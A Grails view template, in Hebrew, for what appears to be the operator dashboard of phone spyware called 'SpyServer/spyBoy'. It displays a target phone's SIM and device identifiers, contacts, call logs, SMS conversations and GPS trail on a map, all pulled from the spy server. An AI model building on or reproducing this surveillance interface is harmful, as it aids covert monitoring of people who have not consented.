<!DOCTYPE html>
<html lang="he">
<head>
<meta name="layout" content="user_area_layout" lang="he" />
</head>
<body lang="he">
	<g:if test="${currentTargetPhone!=null && currentTargetPhone.simSubscriberId !=null}">
	<!-- BEGIN SAMPLE PORTLET CONFIGURATION MODAL FORM-->
	<div id="portlet-config" class="modal hide">
		<div class="modal-header">
			<button data-dismiss="modal" class="close" type="button"></button>
			<h3>Widget Settings</h3>
		</div>
		<div class="modal-body">Widget settings form goes here</div>
	</div>
	<!-- END SAMPLE PORTLET CONFIGURATION MODAL FORM-->
	<!-- BEGIN PAGE CONTAINER-->
	<div class="container-fluid">
		<!-- BEGIN PAGE HEADER-->
		<div class="row-fluid">
			<div class="span12">
				<!-- BEGIN PAGE TITLE & BREADCRUMB-->
				<h3 class="page-title">
					 מידע מהנייד של ${currentTargetPhone.alias}
				</h3>
				<ul class="breadcrumb">
					<li><i class="icon-home"></i> <a href="index-2.html">דף
							הבית</a> <i class="icon-angle-left"></i></li>
					<li><a href="#">שולחן עבודה</a></li>
					<li class="pull-left no-text-shadow">
						<div id="dashboard-report-range"
							class="dashboard-date-range tooltips no-tooltip-on-touch-device responsive"
							data-tablet="" data-desktop="tooltips" data-placement="top"
							data-original-title="Change dashboard date range">
							<i class="icon-calendar"></i> <span></span> <i
								class="icon-angle-down"></i>
						</div>
					</li>
				</ul>
				<!-- END PAGE TITLE & BREADCRUMB-->
			</div>
		</div>
		<!-- END PAGE HEADER-->
		<div id="dashboard">
			<!-- BEGIN DASHBOARD STATS -->
			<%--<div class="row-fluid">
				<div class="span3 responsive" data-tablet="span3"
					data-desktop="span3">
					<div class="dashboard-stat blue">
						<div class="visual">
							<i class="icon-comments"></i>
						</div>
						<div class="details">
							<div class="number">
								${smsInstanceTotal}
							</div>
							<div class="desc">הודעות</div>
						</div>
						<a class="more" href="#"> נתונים נוספים <i
							class="m-icon-swapright m-icon-white"></i>
						</a>
					</div>
				</div>
				<div class="span3 responsive" data-tablet="span3"
					data-desktop="span3">
					<div class="dashboard-stat green">
						<div class="visual">
							<i class="icon-book"></i>
						</div>
						<div class="details">
							<div class="number">
								${callLogsInstanceTotal}
							</div>
							<div class="desc">שיחות</div>
						</div>
						<a class="more" href="#"> נתונים נוספים <i
							class="m-icon-swapright m-icon-white"></i>
						</a>
					</div>
				</div>
				<div class="span3 responsive" data-tablet="span3"
					data-desktop="span3">
					<div class="dashboard-stat purple">
						<div class="visual">
							<i class="icon-globe"></i>
						</div>
						<div class="details">
							<div class="number">
								${locationInstanceTotal}
							</div>
							<div class="desc">מיקום (GPS)</div>
						</div>
						<a class="more" href="#"> נתונים נוספים <i
							class="m-icon-swapright m-icon-white"></i>
						</a>
					</div>
				</div>
				<div class="span3 responsive" data-tablet="span3"
					data-desktop="span3">
					<div class="dashboard-stat yellow">
						<div class="visual">
							<i class="icon-group"></i>
						</div>
						<div class="details">
							<div class="number">
								${contactInstanceTotal}
							</div>
							<div class="desc">אנשי קשר</div>
						</div>
						<a class="more" href="#"> נתונים נוספים <i
							class="m-icon-swapright m-icon-white"></i>
						</a>
					</div>
				</div>
			</div>--%>


			<div class="row-fluid">
				<div class="span12" style="direction:ltr;">	
					<h3>Target Phone Parameters (פרטי מכשיר)</h3>
					<div class="well" style="float:left;margin-right: 10px;">					
						<address> 
							<strong>Sim Subscriber Id : </strong> ${currentTargetPhone.simSubscriberId}
						</address>
						<address> 
							<strong>Alias : </strong> ${currentTargetPhone.alias}
						</address>
						<address> 
							<strong>Call State : </strong> ${currentTargetPhone.callState}
						</address>
						<address> 
							<strong>Cell Location : </strong> ${currentTargetPhone.cellLocation}
						</address>
					</div>
					<div class="well" style="float:left;margin-right: 10px;">
						<address> 
							<strong>Device ID : </strong> ${currentTargetPhone.deviceID}
						</address>					
						<address> 
							<strong>Device Software Version : </strong> ${currentTargetPhone.deviceSoftwareVersion}
						</address>
						<address> 
							<strong>Sim state : </strong> ${currentTargetPhone.simstate}
						</address>
						<address> 
							<strong>Line 1 Number : </strong> ${currentTargetPhone.line1Number}
						</address>
					</div>
					<div class="well" style="float:left;margin-right: 10px;">
						<address> 
							<strong>Network Country Iso : </strong> ${currentTargetPhone.networkCountryIso}
						</address>
						<address> 
							<strong>Network Operator : </strong> ${currentTargetPhone.networkOperator}
						</address>	
						<address> 
							<strong>Network Operator Name : </strong> ${currentTargetPhone.networkOperatorName}
						</address>
						<address> 
							<strong>Phone Type : </strong> ${currentTargetPhone.phoneType}
						</address>
					</div>
					<div class="well" style="float:left;margin-right: 10px;">
						<address> 
							<strong>Sim Country Iso : </strong> ${currentTargetPhone.simCountryIso}
						</address>
						<address> 
							<strong>Sim Operator : </strong> ${currentTargetPhone.simOperator}
						</address>
						<address> 
							<strong>Sim Operator Name : </strong> ${currentTargetPhone.simOperatorName}
						</address>
						<address> 
							<strong>Sim Serial Number : </strong> ${currentTargetPhone.simSerialNumber}
						</address>
					</div>					
				</div>
			</div>

			<!-- END DASHBOARD STATS -->
			<div class="clearfix"></div>

			<div class="row-fluid">
				<div class="span12">
					<!-- BEGIN PORTLET -->
					<div id="contactsPortlet" class="portlet box grey">
						<div class="portlet-title line">
							<div class="caption">
								<i class="icon-group"></i>אנשי קשר
							</div>
							<div class="span3">
								<div class="control-group">
									<div id="contactControls" class="controls">
										<select class="span12 select2_category"
											data-placeholder="חפש איש קשר..." tabindex="1"
											onchange="scrollToElement(this.value);">
											<g:each in="${contactInstanceList}" status="i"
												var="contactInstance">
												<optgroup label="${contactInstance.number}">
													<option value="#contact-${contactInstance.id}">
														${contactInstance.name}
													</option>
												</optgroup>
											</g:each>
										</select>
									</div>
								</div>
							</div>
							<div class="tools">
								<a href="javascript:;" class="collapse"></a> <a
									href="#portlet-config" data-toggle="modal" class="config"></a>
								<a href="javascript:;" class="reload"></a> <a
									href="javascript:;" class="remove"></a>
							</div>
						</div>
						<div class="portlet-body" id="contacts">
							<div id="contacts-scroll" style="direction: ltr;">
								<div id="content_1" class="mCcontent">
									<div class="content-wrapper" id="contactsAjaxTargetDiv">
										<div id="contactSpinner" class="bx-loading"></div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="clearfix"></div>
		
		<div class="row-fluid">
			<div class="span6 responsive">
				<!-- BEGIN EXAMPLE TABLE PORTLET-->
				<div class="portlet box grey">
					<div class="portlet-title">
						<div class="caption">
							<i class="icon-book"></i>שיחות
						</div>
						<div class="tools">
							<a href="javascript:;" class="collapse"></a> <a
								href="#portlet-config" data-toggle="modal" class="config"></a> <a
								href="javascript:;" class="reload"></a> <a href="javascript:;"
								class="remove"></a>
						</div>
					</div>
					<div id="callLogAjaxTargetDiv" class="portlet-body">
						<table
							class="table table-striped table-bordered table-hover table-full-width"
							id="sample_3">
							<thead>
								<tr>
									<th id="callLogNumberThHeader"
										style="min-width: 120px; display: none;">
										${message(code: 'callLog.phoneNumber.label', default: 'phoneNumber')}
									</th>
									<th class="hidden-480" style="min-width: 110px;">
										${message(code: 'callLog.type.label', default: 'type')}
									</th>
									<th class="hidden-480" style="min-width: 120px;">
										${
											message(code: 'callLog.duration.label', default: 'duration')
										}
									</th>
									<th class="hidden-480" style="min-width: 180px !important;">
										${message(code: 'callLog.time.label', default: 'time')}
									</th>
								</tr>
							</thead>
							<tbody>
							</tbody>
						</table>
						<!-- <div id="callLogSpinner" class="bx-loading"></div> -->
					</div>
				</div>
				<!-- END EXAMPLE TABLE PORTLET-->
			</div>
		
			<div class="span6 responsive" style="display:none;">
				<!-- BEGIN PORTLET -->
				<div class="portlet box grey">
					<div class="portlet-title line">
						<div class="caption">
							<i class="icon-comments"></i>הודעות SMS - טבלה (כולל חיפוש)
						</div>
						<div class="tools">
							<a href="javascript:;" class="collapse"></a> <a
								href="#portlet-config" data-toggle="modal" class="config"></a> <a
								href="javascript:;" class="reload"></a> <a href="javascript:;"
								class="remove"></a>
						</div>
					</div>
					<div class="portlet-body" id="smsAjaxTargetDiv">
						<table
							class="table table-striped table-bordered table-hover table-full-width"
							id="sample_5">
							<thead>
								<tr>
									<th class="hidden-480" style="width: 80px !important;">
										${message(code: 'sms.type.label', default: 'סוג')}
									</th>
									<th class="hidden-480">
										${message(code: 'sms.msg.label', default: 'הודעה')}
									</th>
									<th class="hidden-480" style="width: 195px !important;">
										${message(code: 'sms.time.label', default: 'תאריך')}
									</th>
								</tr>
							</thead>
							<tbody>
							</tbody>
						</table>
					</div>
				</div>
				<!-- END PORTLET-->
			</div>

			<div class="span6 responsive">
				<!-- BEGIN PORTLET -->
				<div class="portlet box grey">
					<div class="portlet-title line">
						<div class="caption">
							<i class="icon-comments"></i>הודעות SMS - שיחה
						</div>
						<div class="tools">
							<a href="javascript:;" class="collapse"></a> <a
								href="#portlet-config" data-toggle="modal" class="config"></a> <a
								href="javascript:;" class="reload"></a> <a href="javascript:;"
								class="remove"></a>
						</div>
					</div>
					<div class="portlet-body" id="chats">
						<div id="smsSpinner" class="bx-loading"></div>
					</div>
				</div>
				<!-- END PORTLET-->
			</div>
		</div>
		
		<div class="clearfix"></div>

		<div class="row-fluid">
			<div class="span12">
				<!-- BEGIN MARKERS PORTLET-->
				<div class="portlet box grey">
					<div class="portlet-title">
						<div class="caption">
							<i class="icon-globe"></i>מיקום (GPS)
						</div>
						<div class="tools">
							<a href="javascript:;" class="collapse"></a> <a
								href="#portlet-config" data-toggle="modal" class="config"></a> <a
								href="javascript:;" class="reload"></a> <a href="javascript:;"
								class="remove"></a>
						</div>
					</div>
					<div class="portlet-body">						
						<div id="gmap_table"  style="width:48.9%;float: right;">
							<table
								class="table table-striped table-bordered table-hover table-full-width"
								id="sample_4">
								<thead>
									<tr>
										<th class="hidden-480" style="max-width: 40px !important;">
											${message(code: 'location.point.label', default: 'נקודה')}
										</th>
										<th class="hidden-480">
											${message(code: 'location.address.label', default: 'כתובת')}
										</th>
										<th class="hidden-480">
											${message(code: 'location.time.label', default: 'תאריך')}
										</th>
									</tr>
								</thead>
								<tbody>
								</tbody>
							</table>
						</div>
						<div style="border-right: 1px solid #9D9C9C;float: right;height: 500px;margin-left: 18px;margin-right: 18px;"></div>						
						<div id="gmap_marker" class="gmaps" style="width:47%;"></div>
					</div>
				</div>
				<!-- END MARKERS PORTLET-->
			</div>
		</div>

		<div class="clearfix"></div>

		<div class="page-content-body"></div>
	</div>
	</div>
	<!-- END PAGE CONTAINER-->
	<script>	
		var scrollingFinished=false;	
		function spinner(spinnerId){					  
			$(spinnerId).show();						
		}	

		var firstTimeScroll= true;
		//spinner('#contactSpinner');
		function loadContacts(simSubscriberId){
			
			jQuery.ajax({
				type : 'POST',
				url : '/SpyServer/spyBoy/contacts',
				data : {
					"simSubscriberId":simSubscriberId				
				},
				success : function(data, textStatus) {
	
					jQuery('#contactsAjaxTargetDiv').html(data);	
						
					jQuery("#content_1").mCustomScrollbar({
						scrollButtons:{
							enable:true
						},
						horizontalScroll:true,
						advanced:{
							autoExpandHorizontalScroll:true,
							updateOnContentResize:false,
							updateOnBrowserResize:true
						},
						callbacks:{						
							onScroll:function(){
								scrollingFinished=true;
							}
						},
						theme:"dark-thick"
					})										
					jQuery(".badge").corner("12px");	
					jQuery(".contact-picture").corner("12px");		
	
					scrollToElement("#contact-104");
							
				},
				error : function(XMLHttpRequest, textStatus, errorThrown) {	
					alert("error contacts ajax");				
				}
			});
		}

		function scrollToElement(element){
			scrollingFinished=false;
			jQuery("#content_1").mCustomScrollbar('scrollTo',element);
			var int=self.setInterval(function(){
				if(scrollingFinished){
				    window.clearInterval(int);
				    jQuery(element).click(); 			   
				}
			 },1000);				
		}
		
		//<g:remoteFunction update="chats" controller="spyBoy" action="sms" before="spinner('#smsSpinner')"/>
		//<g:remoteFunction update="contactsAjaxTargetDiv" controller="spyBoy" action="contacts" before="spinner('#contactSpinner')" />
		//<g:remoteFunction update="callLogAjaxTargetDiv" controller="spyBoy" action="callLog" before="spinner('#callLogSpinner')"/>
		var map, iw, task;
		var jsonList  ${locationInstanceList !=null ? '=' + locationInstanceList :''};	
		var total =${locationInstanceTotal};
						
		function initialize() {
			try{					
				MapsGoogle.init(total,jsonList);
				var myLatLng = new google.maps.LatLng(jsonList[0].latitude, jsonList[0].longitude);
				var myOptions = {zoom: 15,center: myLatLng,mapTypeId: google.maps.MapTypeId.ROADMAP};
				map = new google.maps.Map(document.getElementById("gmap_marker"), myOptions);
	
				for(var i=0;i<${locationInstanceTotal};i++){

					//new google.maps.Marker({
					//	position: new google.maps.LatLng(jsonList[i].latitude, jsonList[i].longitude),
					//	map: map,
					//    title: jsonList[i].address,
					//    animation: google.maps.Animation.DROP					 
					//});					
					new StyledMarker({styleIcon:new StyledIcon(StyledIconTypes.MARKER,{color:"73B819",text:jsonList[i].id+ "",starcolor:null,fore:'ffffff'}),position:new google.maps.LatLng(jsonList[i].latitude, jsonList[i].longitude),map:map});	
				}	
			}catch(e){
			}				
		}
		
		jQuery(document).ready(function() {	
			loadContacts(${activeSimSubscriberId});
			if(${locationInstanceList!=null}){			
				initialize();
			}
			loadLocation(${activeSimSubscriberId});
		});	

		function centerMap(latitude,longitude){
			var pos = new google.maps.LatLng(latitude,longitude);
			map.setCenter(pos);
			map.setZoom(17);
		}
		
		function loadLocation(simSubscriberId){				
	        var oTable = $('#sample_4').dataTable({   
	            "bDestroy":true,         
	        	"bProcessing": true,
	        	"bServerSide": true,
	        	"bSearch":false,
	        	"aaSorting": [[ 0, "asc" ]],					
				"sAjaxSource": '/SpyServer/spyBoy/location',
				"sAjaxDataProp" : "locationInstanceList",
				"fnServerParams":  function ( aoData ) {
		            aoData.push({"name":"simSubscriberId","value":simSubscriberId});},
				"aoColumns": [
				  			{ "mData": "id"},
				  			{ "mData": "address" },
				  			{ "mData": "time" },
				  			{ "mData": "latitude" },
				  			{ "mData": "longitude" }
				],				 
				"aoColumnDefs": [
	  		               {
	  		                   "mRender": function ( data, type, row ) {
		  		                   result ='<div style="color:blue;cursor: pointer;" onclick="centerMap('+row.latitude + "," + row.longitude +')">' + data + '</div>';
	  		                       return result;},
	  		                  "aTargets": [ 0 ]
	  		               },
	  		               {"bVisible":false,"aTargets": [ 3 ]},
	  		               {"bVisible":false,"aTargets": [ 4 ]}
	  			], 		
	            "aLengthMenu": [
	                [5, 15, 20, -1],
	                [5, 15, 20, "All"] // change per page values here
	            ],
	            // set the initial value
	            "iDisplayLength": 5,
	            "sDom": "<'row-fluid'<'span6'l><'span1'f>r>t<'row-fluid'<'span4'i><'span8'p>>", //"sDom": "<'row-fluid'<'span6'l><'span0'f>r>t<'row-fluid'<'span4'i><'span8'p>>",
	            "sPaginationType": "bootstrap",
	            "oLanguage": {
	                "sLengthMenu": "מציג _MENU_ תוצאות לדף.",
	                "sZeroRecords": "לא נמצאות תוצאות להצגה.",
	                "sInfo": "מציג _START_ עד _END_ מתוך _TOTAL_",
	                "sInfoEmpty": "מציג - 0  מ- 0 מתוך 0 רשומות",
	                "sInfoFiltered": "",//"(מסונן מתוך _MAX_ סה''כ רשומות')",
	                "sProcessing": "טוען נתונים...",
	                "sSearch": "חיפוש :",
	                "oPaginate": {
	                    "sPrevious": "אחורה",
	                    "sNext": "קדימה"
	                }
	            }
	        });

	        jQuery('#sample_4_wrapper .dataTables_filter input').addClass("m-wrap small"); // modify table search input
	        jQuery('#sample_4_wrapper .dataTables_length select').addClass("m-wrap small"); // modify table per page dropdown
	        jQuery('#sample_4_wrapper .dataTables_length select').select2(); // initialize select2 dropdown


	        //sho column for all callLog if needed.
	        //***********************************************************
	        //var bVis = oTable.fnSettings().aoColumns[0].bVisible;
	        //oTable.fnSetColumnVis(0, (bVis ? false : true),true);
	        //jQuery("#callLogNumberThHeader").show();
		}
		
		</script>
		</g:if>
	</body>
</html>